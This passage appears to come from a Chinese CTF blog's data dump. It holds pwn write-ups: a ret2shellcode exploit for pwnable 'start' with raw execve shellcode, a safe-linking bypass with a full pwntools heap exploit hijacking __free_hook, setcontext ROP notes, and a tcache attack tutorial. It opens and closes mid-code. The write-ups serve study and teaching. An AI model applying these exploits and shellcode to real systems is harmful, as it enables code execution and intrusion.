cyclic(11)+p64(onegadget_addr)+p64(realloc_addr+2)edit(5,len(payload),payload)add(0x10)io.interactive()\n\n","categories":["wp"]},{"title":"pwnable_start","url":"/2022/12/04/pwnable-start/","content":"一道很有趣的题目 原理基础ret2shellcode 但是考查了汇编代码的阅读以及栈结构的理解 还有内平栈\n涉及到的知识点还是很多的 这里讲细一点\n内平栈内平栈（In—Place Stack）是一种特殊的栈，可以在一个给定的数组中存储元素，并可以支持压栈和弹栈操作，且不需要额外的内存空间。保持堆栈平衡的关键是使用一个变量（称为指针，即esp）来跟踪堆栈顶部的位置。当元素被压入堆栈时，指针会指向新元素，表示它是当前堆栈的顶部。当元素被弹出堆栈时，指针会移动到上一个元素的位置，表示它是当前堆栈的新顶部。这样，指针就可以在堆栈操作过程中保持堆栈平衡。\n外平栈外平栈（External Stack）是一种特殊的栈，可以存储元素，并可以支持压栈和弹栈操作，但需要额外的内存空间。与内平栈不同，外平栈不使用指针来跟踪堆栈顶部的位置，而是使用两个变量：一个用于标识堆栈顶部的位置(esp)，另一个用于标识堆栈底部的位置(ebp)。当元素被压入堆栈时，顶部变量会指向新元素，表示它是当前堆栈的顶部。当元素被弹出堆栈时，底部变量会指向上一个元素的位置，表示它是当前堆栈的新底部。这样，两个变量就可以在堆栈操作过程中保持堆栈平衡。\n程序分析checksec看一下保护机制\n[*] &#x27;/home/chen/pwn&#x27;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)\n\n保护机制全部关闭 再ida看一下\n.text:08048060                 public _start.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o.text:08048060                 push    esp.text:08048061                 push    offset _exit.text:08048066                 xor     eax, eax.text:08048068                 xor     ebx, ebx.text:0804806A                 xor     ecx, ecx.text:0804806C                 xor     edx, edx.text:0804806E                 push    3A465443h.text:08048073                 push    20656874h.text:08048078                 push    20747261h.text:0804807D                 push    74732073h.text:08048082                 push    2774654Ch.text:08048087                 mov     ecx, esp        ; addr.text:08048089                 mov     dl, 14h         ; len.text:0804808B                 mov     bl, 1           ; fd.text:0804808D                 mov     al, 4.text:0804808F                 int     80h             ; LINUX - sys_write.text:08048091                 xor     ebx, ebx.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;.text:08048095                 mov     al, 3.text:08048097                 int     80h             ; LINUX -.text:08048099                 add     esp, 14h.text:0804809C                 retn.text:0804809C _start          endp ; sp-analysis failed\n\n应该不是用c语言编译的 很干净 只有一个exit函数和start函数 反编译后看不出什么所以然\n并且可以看到没有ebp指针 说明这题是内平栈 是利用esp指针来控制程序执行流\n__int64 start()&#123;  __int64 result; // rax  result = 0x3C00000003LL;  __asm  &#123;    int     80h; LINUX - sys_write    int     80h; LINUX -  &#125;  return result;&#125;\n\n这里直接解读汇编吧\n.text:08048060                 push    esp.text:08048061                 push    offset _exit.text:08048066                 xor     eax, eax.text:08048068                 xor     ebx, ebx.text:0804806A                 xor     ecx, ecx.text:0804806C                 xor     edx, edx\n\n前面6行对这个栈帧进行了初始化的操作 push入栈了esp 接着入栈了返回地址为exit函数\n随后对于四个寄存器进行了归零操作\n.text:0804806E                 push    3A465443h.text:08048073                 push    20656874h.text:08048078                 push    20747261h.text:0804807D                 push    74732073h.text:08048082                 push    2774654Ch\n\n16进制转化成人话就是: Let’s start the CTF:\n这里的五次push 使得esp指向减少了0x14\n此时的栈帧结构为:\n\n.text:08048087                 mov     ecx, esp        ; addr.text:08048089                 mov     dl, 14h         ; len.text:0804808B                 mov     bl, 1           ; fd.text:0804808D                 mov     al, 4.text:0804808F                 int     80h\n\n接着把esp所指向的内存空间赋值给了ecx 这里可以看到ida识别出来了 其被作为一个函数的addr参数 这个函数是什么先别急 我们一行一行看\n这里出现了一个新的寄存器名称 为什么只是dl？ 并且在ida中我们选中其 会和edx一起关联起来 二者有什么关系？\n32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。对低16位数据的存取，不会影响高16位的数据。这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。Eax是32位寄存器，ax是16位寄存器,al(ah)是八位寄存器Eax可以存储的数字是DWORD（双字）ax存储的是WORD（字）AL(AH)存储的是BYTE（字节），那么为什么又有AH和AL呢，我们可以这样理解，AX=AH+AL，AH存储的是AX的高８位数据，AL存储的是AX的低八位数据。H这里就是HIGH,Ｌ就是LOW.取自https://blog.csdn.net/EVEPITWANG/article/details/89447466\n\n相当于给这个函数赋值了长度参数(ida识别出来的len)\n那么接下来的bl寄存器同理 相当于ebx的低8位 赋值为了1\n重点来了 eax的低八位被赋值为了4 随后进行了int 0x80 也就是系统调用\n那么我们查询一下调用号为4的函数是什么 发现是write函数\n(5条消息) linux 系统调用号表_Anciety的博客-CSDN博客_系统调用号\n那么上述汇编代码翻译成c语言也就是\nwrite(1,esp,0x14)\n\n所以 相当于输出了上面push入栈的那0x14字节的数据 也就是输出了相应的字符串\n但是这里注意一下 栈仍然是不变的 此时栈的结构和esp指针仍然是保留原状(即上文的图所示)\n接下来再看\n.text:08048091                 xor     ebx, ebx.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;.text:08048095                 mov     al, 3.text:08048097                 int     80h             ; LINUX -\n\n赋值了两个参数 edx(参数len)为0x3c eax(系统调用号)为3 还有xor ebx,ebx相当于ebx赋为0\n调用号3是read函数 也就是\nread(0,esp,0x3c)\n\n所以我们可以在esp指针指向的地方 输入0x3c字节数据\n接着看剩下的代码\n.text:08048099                 add     esp, 14h.text:0804809C                 retn\n\n使esp寄存器的值增加0x14 此时esp指向的是存放offset _exit地址的空间\n随后retn指令相当于pop eip 也就是控制程序执行流到exit函数 进行一个退出\n在retn过后 此时栈帧就只剩下一个old esp了\n分析完了程序 那么我们来想一下利用的思路\n我们拥有栈溢出的机会 并且得知了具体哪一块栈空间可以用来控制程序执行流 并且保护全关\n没有system函数也没有泄露libc的机会 也没有足够的栈溢出长度来供我们使用onegadget生成的shellcode直接pwn\n那么这时候想到的是ret2shellcode 我们只能在栈上写入shellcode 但是没有bss段供我们写入的机会 所以只能写在栈上\n那么要做的就是泄露栈上的地址 想一下 程序唯一能够利用输出的地方也就是write函数那边了\n.text:08048087                 mov     ecx, esp        ; addr.text:08048089                 mov     dl, 14h         ; len.text:0804808B                 mov     bl, 1           ; fd.text:0804808D                 mov     al, 4.text:0804808F                 int     80h             ; LINUX - sys_write\n\n看到第一个 mov ecx,esp 我们再联想到 retn指令执行完了以后 栈帧只剩下了old esp 并且此时esp仍然指向old esp 此时如果执行\n这一行指令 那么ecx的值就会被赋为old esp 也就是程序会输出old esp 也就是泄露了栈地址\n所以我们第一次写入的payload为\npayload = cyclic(0x14)+p32(0x8048087)#0x14字节的垃圾数据用来填充push入栈的那串字符串 p32(0x8048087)覆盖的是offset _exit 用来控制程序执行流\n\n此时程序就会输出old esp 那么接下来又要怎么利用\n我们知道 控制程序执行流利用的是retn这个指令 但是在其生效前 esp指针会被抬高0x14字节\n所以我们需要0x14字节的垃圾数据 然后再往栈上写入shellcode存放的地址 然后控制程序执行流到shellcode\n这一系列的操作用图演示为;\n\n所以此时eip接收到了stack_addr(我们泄露的栈地址)+0x14\n其寻址到shllcode的栈空间 于是我们就获取了shell\n完整的exp:\nfrom pwn import*io = process(&quot;./pwn&quot;)io.recv()payload = cyclic(0x14)+p32(0x8048087)io.send(payload)stack_addr = u32(io.recv(4))shellcode = b&quot;\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80&quot;#这里不能用pwntools生成的shellcode 估计是太长了 溢出空间不够payload = cyclic(0x14)+p32(stack_addr+0x14)+shellcodeio.send(payload)\n","categories":["wp"]},{"title":"safe-linking","url":"/2023/03/03/safe-linking/","content":"前言低版本中 无论是tcachebin还是fastbin 只要我们修改fd域就可以将对应地址放置到链表上 威胁程度非常高\n在libc2.32以后 saft-linking机制诞生 一定程度上缓解了这种现象的出现\n其通过在chunk被释放到链表之前对fd域进行加密 取出后解密来实现堆块的存入和取出 并且有效遏制了用户在没有密匙的情况下篡改fd域从而实现任意地址申请的chunk\n不过这个加密的手段比较简单 所以我们仍然有办法绕过这个机制 只需要获取其密匙就行了\n源码解析/* Safe-Linking:   Use randomness from ASLR (mmap_base) to protect single-linked lists   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the   lists&#x27; chunks, and also perform allocation alignment checks on them.   This mechanism reduces the risk of pointer hijacking, as was done with   Safe-Unlinking in the double-linked lists of Small-Bins.   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with   larger pages provide less entropy, although the pointer mangling   still works.  */#define PROTECT_PTR(pos, ptr) \\  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)\n\npos是指针本身的地址 ptr是指针的值\n加密的公式翻译成中文形式也就是\n(fd指针地址算术右移12位)异或(指针的值)\n\n如果我们想要按照以前一样任意地址取出chunk 就需要在修改fd域的时候就按照这个加密办法\n这也就意味着我们需要获取到堆的地址 这样才能伪造fd域\n利用你可能会想到申请两个chunk 释放进bin中 随后泄露其fd域 获取堆地址\n这样当然可行 不过由于这个机制  我们泄露fd域的方法会更加简单 如果单纯释放一个chunk到tcache链表中\n换做往常 其fd域值为0\n\n但是受到机制的影响 在2.32版本以后 此时的fd域应该是 \n(0x55b170682260&gt;&gt;12) ^ 0\n\n\n你会发现最后的结果也就是去除了后三位  这就意味着如果我们释放一个chunk到tcachebin中 再泄露出fd域 得到的值算术左移12位 就可以得到堆基址  因为堆基址是从当前页起始 也就是后三位固定为0 并且只申请一个chunk的话 大小总不会超过0x1000吧 \n\n于是 如果我们想要通过tcachebin获取任意地址的堆块 只需要将对应地址异或(堆基址&gt;&gt;12) 前提是你没有申请超过0x1000大小的chunk 致使对应的chunk到了下一页\n真题分析Hgame2023-week3-safenote题目环境2.32 做题环境ubuntu18 libc2.27\n\n一共给了四个函数add函数 可以申请0xff大小以下的chunkdelete函数 释放chunk后并没有置零指针 存在UAFedit函数 没有办法堆溢出show函数 调用puts函数输出堆块内容\n\n非常常规的一道题 无非就是利用UAF实现libc基址的泄露 并且利用tcache打hook\n但是因为版本在libc2.32 所以有几个地方需要注意\n由于最大只能申请0xff大小的chunk 并且没有办法chunk extend 所以这里采用填满tcache链表的办法使得chunk被释放到unsortedbin中\nfor i in range(8):    add(i,0x80)delete(0)show(0)heap_addr = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))&lt;&lt;12success(&quot;heap_addr :&quot;+hex(heap_addr))\n\n同时我们可以多申请一个chunk 利用这个chunk来泄露堆基址\n紧接着填满tcache链表后再释放一个chunk进入unsortedbin 从而泄露libc基址\nadd(8,0x10)          #防止unsortedbin合并for i in range(1,8):    delete(i)edit(7,&#x27;\\x11&#x27;)show(7)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x11success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7fea010bfc00-0x7fea00edc000)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]onegadget_addr = libc_addr + 0xdf54f\n\n这里之所以要修改chunk7的最后一个字节再打印出来 是因为该版本的main_arena_addr+96最后一个字节是00 如果直接泄露的话 显然是会被截断\n\n接下来的任务就很简单了 打free_hook\npayload = (heap_addr&gt;&gt;12)^(free_hook)edit(6,p64(payload))add(9,0x80)add(10,0x80)edit(10,p64(onegadget_addr))delete(0)io.interactive()\n\n\n\n完整exp:\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;47.99.93.110&quot;,10001)context.log_level = &quot;debug&quot;libc = ELF(&quot;/home/chen/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()def add(index,size):    io.sendlineafter(&quot;5. Exit&quot;,b&#x27;1&#x27;)    io.sendlineafter(&quot;Index: &quot;,str(index))    io.sendlineafter(&quot;Size: &quot;,str(size))def delete(index):    io.sendlineafter(&quot;5. Exit&quot;,b&#x27;2&#x27;)    io.sendlineafter(&quot;Index: &quot;,str(index))def edit(index,content):    io.sendlineafter(&quot;5. Exit&quot;,b&#x27;3&#x27;)    io.sendlineafter(&quot;Index: &quot;,str(index))    io.sendafter(&quot;Content: &quot;,content)def show(index):    io.sendlineafter(&quot;5. Exit&quot;,b&#x27;4&#x27;)    io.sendlineafter(&quot;Index: &quot;,str(index))for i in range(8):    add(i,0x80)delete(0)show(0)heap_addr = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))&lt;&lt;12success(&quot;heap_addr :&quot;+hex(heap_addr))add(8,0x10)for i in range(1,8):    delete(i)edit(7,&#x27;\\x11&#x27;)show(7)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x11success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7fea010bfc00-0x7fea00edc000)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]onegadget_addr = libc_addr + 0xdf54fpayload = (heap_addr&gt;&gt;12)^(free_hook)edit(6,p64(payload))add(9,0x80)add(10,0x80)edit(10,p64(onegadget_addr))delete(0)io.interactive()\n\n","categories":["堆"]},{"title":"setcontext构造rop链","url":"/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/","content":"用途比较大的一个办法 通常适用的是开启了沙盒的堆 然后用来构造orw链不过libc2.29是一个比较大的分水岭 前后的版本关于setcontext的利用不一样\nlibc2.27.text:0000000000052070                 public setcontext ; weak.text:0000000000052070 setcontext      proc near               ; CODE XREF: sub_586B0+C↓p.text:0000000000052070                                         ; DATA XREF: LOAD:0000000000009018↑o.text:0000000000052070 ; __unwind &#123;.text:0000000000052070                 push    rdi.text:0000000000052071                 lea     rsi, [rdi+128h] ; nset.text:0000000000052078                 xor     edx, edx        ; oset.text:000000000005207A                 mov     edi, 2          ; how.text:000000000005207F                 mov     r10d, 8         ; sigsetsize.text:0000000000052085                 mov     eax, 0Eh.text:000000000005208A                 syscall                 ; LINUX - sys_rt_sigprocmask.text:000000000005208C                 pop     rdi.text:000000000005208D                 cmp     rax, 0FFFFFFFFFFFFF001h.text:0000000000052093                 jnb     short loc_520F0.text:0000000000052095                 mov     rcx, [rdi+0E0h].text:000000000005209C                 fldenv  byte ptr [rcx].text:000000000005209E                 ldmxcsr dword ptr [rdi+1C0h].text:00000000000520A5                 mov     rsp, [rdi+0A0h].text:00000000000520AC                 mov     rbx, [rdi+80h].text:00000000000520B3                 mov     rbp, [rdi+78h].text:00000000000520B7                 mov     r12, [rdi+48h].text:00000000000520BB                 mov     r13, [rdi+50h].text:00000000000520BF                 mov     r14, [rdi+58h].text:00000000000520C3                 mov     r15, [rdi+60h].text:00000000000520C7                 mov     rcx, [rdi+0A8h].text:00000000000520CE                 push    rcx.text:00000000000520CF                 mov     rsi, [rdi+70h].text:00000000000520D3                 mov     rdx, [rdi+88h].text:00000000000520DA                 mov     rcx, [rdi+98h].text:00000000000520E1                 mov     r8, [rdi+28h].text:00000000000520E5                 mov     r9, [rdi+30h].text:00000000000520E9                 mov     rdi, [rdi+68h].text:00000000000520E9 ; &#125; // starts at 52070.text:00000000000520ED ; __unwind &#123;.text:00000000000520ED                 xor     eax, eax.text:00000000000520EF                 retn\n你可以在libc文件中搜索函数setcontext找到这一串汇编前面的指令没啥用 重点是 .text:00000000000520A5                 mov     rsp, [rdi+0A0h] 这一句rsp寄存器的值由rdi寄存器决定的 rdi可太好控制了 我们执行free函数 rdi的值就是被释放的chunk的用户区地址但是光控制rsp寄存器也没用 他不执行啊 还得再把rop链弹到rip寄存器里面那就要用到ret指令了是吧 往下看一看 找到了 .text:00000000000520CE                 push    rcx把rcx的值入栈 rcx能不能控制啊 能啊 .text:00000000000520C7                 mov     rcx, [rdi+0A8h]那就意味着 我们可以利用这三行 实现一个栈迁移 劫持程序执行流并且所需要的只是覆盖free_hook演示的话 可以看一看wp分类里的Ciscn复现里的一题\nlibc2.292.29对于setcontext进行了优化 不好利用了\n.text:0000000000055E00                 public setcontext ; weak.text:0000000000055E00 setcontext      proc near               ; CODE XREF: sub_5C160+C↓p.text:0000000000055E00                                         ; DATA XREF: LOAD:000000000000C6D8↑o.text:0000000000055E00 ; __unwind &#123;.text:0000000000055E00                 push    rdi.text:0000000000055E01                 lea     rsi, [rdi+128h] ; nset.text:0000000000055E08                 xor     edx, edx        ; oset.text:0000000000055E0A                 mov     edi, 2          ; how.text:0000000000055E0F                 mov     r10d, 8         ; sigsetsize.text:0000000000055E15                 mov     eax, 0Eh.text:0000000000055E1A                 syscall                 ; LINUX - sys_rt_sigprocmask.text:0000000000055E1C                 pop     rdx.text:0000000000055E1D                 cmp     rax, 0FFFFFFFFFFFFF001h.text:0000000000055E23                 jnb     short loc_55E80.text:0000000000055E25                 mov     rcx, [rdx+0E0h].text:0000000000055E2C                 fldenv  byte ptr [rcx].text:0000000000055E2E                 ldmxcsr dword ptr [rdx+1C0h].text:0000000000055E35                 mov     rsp, [rdx+0A0h].text:0000000000055E3C                 mov     rbx, [rdx+80h].text:0000000000055E43                 mov     rbp, [rdx+78h].text:0000000000055E47                 mov     r12, [rdx+48h].text:0000000000055E4B                 mov     r13, [rdx+50h].text:0000000000055E4F                 mov     r14, [rdx+58h].text:0000000000055E53                 mov     r15, [rdx+60h].text:0000000000055E57                 mov     rcx, [rdx+0A8h].text:0000000000055E5E                 push    rcx.text:0000000000055E5F                 mov     rsi, [rdx+70h].text:0000000000055E63                 mov     rdi, [rdx+68h].text:0000000000055E67                 mov     rcx, [rdx+98h].text:0000000000055E6E                 mov     r8, [rdx+28h].text:0000000000055E72                 mov     r9, [rdx+30h].text:0000000000055E76                 mov     rdx, [rdx+88h].text:0000000000055E76 ; &#125; // starts at 55E00.text:0000000000055E7D ; __unwind &#123;.text:0000000000055E7D                 xor     eax, eax.text:0000000000055E7F                 retn\n你可以看到 变成rdx寻址了 不过也不碍事 还是有办法解决介绍一个新的工具 ropper 其可以查询libc文件中的一些gadget\nropper -f libc文件路径 --search &#x27;指令&#x27;\n就比如此时我们想要 可以修改rdx值的gadget找到了很多串 远不止图片上这些rdi寄存器还是很好控制的 所以我们想的是利用rdi控制rdx 利用rdx控制rsp 这样利用rdx做一个中间商那就找呗 找啊找啊 找到下面这串前面的mov 就不提了 可以修改rdx的值 最后的call才是关键呐rdx此时已经被我们操控了 那么[rdx+0x20]也是可被控制的 这里填入setcontext的地址不就好了 此时rdx的值已经被控制了 所以rsp也可以 那么就跟上面一样了实战利用在wp分类中的hgame2023\n","categories":["堆"]},{"title":"tcachebinattack","url":"/2023/02/25/tcachebinattack/","content":"在libc2.26以后 加入了tcachebins 其与fastbin同为单向链表 作用类似于一个缓存区 当用户申请chunk时 优先在tcache中查找 如果无果才进入分配区\n#if USE_TCACHE/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */# define TCACHE_MAX_BINS        64# define MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables.  */# define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When &quot;x&quot; is from chunksize().  */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When &quot;x&quot; is a user-provided size.  */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are...   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)   idx 1   bytes 25..40 or 13..20   idx 2   bytes 41..56 or 21..28   etc.  *//* This is another arbitrary limit, which tunables can change.  Each   tcache bin will hold at most this number of chunks.  */# define TCACHE_FILL_COUNT 7#endif\n\ntcache的定义如上 简单来说就是一个范围0x10-0x408大小(用户申请大小)的单向链表 一共可以存储64个chunk  每个链表可以存储7个chunk\n// 从 tcache list 中获取内存  if (tc_idx &lt; mp_.tcache_bins // 由 size 计算的 idx 在合法范围内      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */      &amp;&amp; tcache      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // 该条 tcache 链不为空    &#123;      return tcache_get (tc_idx);    &#125;  DIAG_POP_NEEDS_COMMENT;#endif  // 进入与无 tcache 时类似的流程  if (SINGLE_THREAD_P)    &#123;      victim = _int_malloc (&amp;main_arena, bytes);      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));      return victim;    &#125;\n\n当用户从tcache中申请内存的时候并非是和fastbin一样通过__int_malloc函数来实现\n而是通过专用的**tcache_get()**函数 其调用优先度高于fastbin 当有合适大小的chunk被申请时 如果tcache满足条件那么优先从tcache中申请\nlibc2.26以及老版本的2.27tcache最早于2.26诞生 但是2.26的glibc由于是过渡版本 glibc-all-in-one下载不到 我在其他渠道下载到了glibc2.26并没有符号表 所以不好演示 自己尝试编译了glibc但是最后以失败告终 好在2.26和老版本的2.27有着同样的漏洞 所以这里我们一概而论\n这时候的tcache对于double free甚至没有检测 我们直接两次释放同一个chunk 可以看到成功释放进去了\nadd(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(0)delete(0)debug()\n\n\n并且tcachebin对于chunk的取出也没有进行限制\nadd(0x68,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)show(1)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f688abebca0-0x7f688a800000)success(&quot;libc_addr :&quot;+hex(libc_addr))delete(0)delete(0)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]add(0x68,p64(free_hook))debug()\n\n\n此时已经将free_hook放入到了链表中 我们尝试将其取出\nadd(0x68,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)show(1)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f688abebca0-0x7f688a800000)success(&quot;libc_addr :&quot;+hex(libc_addr))delete(0)delete(0)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]success(&quot;free_hook :&quot;+hex(free_hook))add(0x68,p64(free_hook))add(0x68,b&#x27;aaaa&#x27;)add(0x68,b&#x27;aaaa&#x27;)debug()\n\n并且可以看到 tcache和fastbin不同的在于 其指向的是chunk的用户区首地址\n\n高版本2.27版本高一点的glibc-2.27引入了对于double free的检查\nadd(0x68,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)show(1)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f688abebca0-0x7f688a800000)success(&quot;libc_addr :&quot;+hex(libc_addr))delete(0)delete(0)io.recv()io.recv()\n\n我们还是和上一题一样 这里直接两次释放chunk0 但是与之不同的是被检测出来了double free\n\n那有没有什么可以绕过的办法呢 类似fastbin一样的? 我们来看一下tcache对于double free检查机制的源码\ntypedef struct tcache_entry&#123;  struct tcache_entry *next;  //链表指针，对应chunk中的fd字段  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;  //指向所属的tcache结构体，对应chunk中的bk字段&#125; tcache_entry;\n\n对于每一个tcache都有一个key指针指向\n借助这个key指针 plmalloc可以更好的对double free进行检查\nsize_t tc_idx = csize2tidx(size);//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)    &#123;      /* Check to see if it&#x27;s already in the tcache.  */      tcache_entry *e = (tcache_entry *)chunk2mem(p);       /*        如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来      */      if (__glibc_unlikely(e-&gt;key == tcache))//汇报错误信息      &#123;        tcache_entry *tmp;        LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);        for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)          if (tmp == e)            malloc_printerr(&quot;free(): double free detected in tcache 2&quot;);      &#125;       if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  //通过检查，放入tcahce中      &#123;        tcache_put(p, tc_idx);        return;      &#125;    &#125;\n\n所以 如果我们还想要使用tcache double free的话 就只能修改key字段 或者是fastbin double free\n但是由于fastbin对于chunk的取出有着size域的检查 相对来说不好办 并且我们还需要填满tcache的对应链表才能把chunk释放进fastbin\n好在更新同时带来了stash机制\n要想明白这个机制的用处 我们先要清楚tcachebin的设计目的是什么\n在多线程的情况下 plmalloc会遇到主分配区被抢占的问题 只能等待或者是申请一个非主分配区\n针对这种情况 plmalloc为每个线程都涉及一个缓冲区 即tcache\n而stash机制就是 如果用户申请一个0x60大小的chunk tcache里面没有的话 就会进入分配区处理\n此时如果哪个bin中含有满足条件的chunk 除了分配这一次请求之外\n其会认为该线程还需要更多类似大小的chunk 为了避免下次继续重复这一步骤 就会将该bin链表中的所有chunk放入到对应tcachebin的链表中\n这个绕过手法存在的意义是因为高版本的tcache对于double free的检查更加严格 是对比整个链表 所以很难利用 如果我们在fastbin中构造好fake chunk 再利用这个机制 就可以继续使用tcachebinattack\n话归正题 开始还是2.27中的问题 由于多了tcachebin 所以会优先进入tcachebin 我们还得先填满tcachebin中的一个链表 才能释放chunk到fastbin\nadd(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x68,b&#x27;aaaa&#x27;)#2for i in range(7):    add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7):    delete(i+3)delete(0)delete(1)delete(0)debug()\n\n接着我们先把在tcache中的chunk全部申请回来 然后再构造fake fd\nadd(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x68,b&#x27;aaaa&#x27;)#2for i in range(7):    add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7):    delete(i+3)delete(0)delete(1)delete(0)for i in range(7):    add(0x68,b&#x27;aaaa&#x27;)add(0x68,b&#x27;testtest&#x27;)debug()\n\n在执行到最后一个add的时候 plmalloc在tcache中找不到合适的chunk 而在fastbin中找到了 所以此时就会把fastbin对应的链表转移到tcache中 如图所示\n\n绕过key检查还可以直接绕过key的检查来实现tcache的double free 只要能修改到free chunk中的内容就好了\n\n可以看到所谓的key检查 也就是在tcachebin中的chunk的bk域存入tcache_perthread_struct结构体的地址\n也就是在堆基址处0x251大小的chunk\n\nif (__glibc_unlikely(e-&gt;key == tcache))\n\n回顾一下源码对double free的判断 只有key的值等于tcache的时候才会对链表中所有的chunk进行遍历\n如果我们将key值改为其他 就不会进入if中\nadd(0x10,b&#x27;aaaa&#x27;)delete(0)payload = p64(0)*2edit(0,len(payload),payload)delete(0)debug()\n\n如上所示 我们将已经处于tcachebin中的chunk的bk域清空 这样再次free的时候就没有触发double free\n劫持tcache_perthread_struct结构体typedef struct tcache_perthread_struct&#123;  char counts[TCACHE_MAX_BINS];  tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;其中 TCACHE_MAX_BINS的宏定义为# define TCACHE_MAX_BINS   64\n\n从源码定义中可以看到  tcache_perthread_struct主要由两部分构成\ncounts数组一共占用64字节 每个字节对应着一个链表 用来存放对应链表中存放着多少个chunk\nentry指针数组则是用来存储每个链表中链表头的chunk地址 一共占用8*64字节\n再加上tcache_perthread_struct的chunk头的0x11字节 就是0x251字节 组成了堆基址的第一个chunk\n这两个数组都能达到攻击效果 下面来演示一下\ncounts数组我们知道 一个tcache链表中最多存放7个chunk 如果超过这个数 就会根据size将其存放到fastbin或者是unsortedbin 而plammloc判断存放几个chunk 根据的就是count数组中对应的值 如果我们将这个值修改 然后再次释放对应的chunk 就可以不将其释放到tcachebin中\nadd(0x10,b&#x27;aaaa&#x27;)#0delete(0)edit(0,16,p64(0)*2)delete(0)show(0)io.recv()heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True )[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x260success(&quot;heap_addr :&quot;+hex(heap_addr))\n\n首先我们duoble free一个0x10大小的chunk 这样其fd域就存放着其地址 经过计算 我们就可以得到堆基址\n随后利用UAF 来实现任意地址写 我们任意写的地址挑在tcache_perthread_struct结构体中 目的是为了修改counts数组\nedit(0,8,p64(heap_addr+0x10))\n\n\n此时链表结构如图所示 我们再次申请两个chunk\n第二个chunk就指向tcache_perthread_struct结构体 我们将对应0xa0链表的counts修改为7\nadd(0x10,b&#x27;aaaa&#x27;)#1payload = 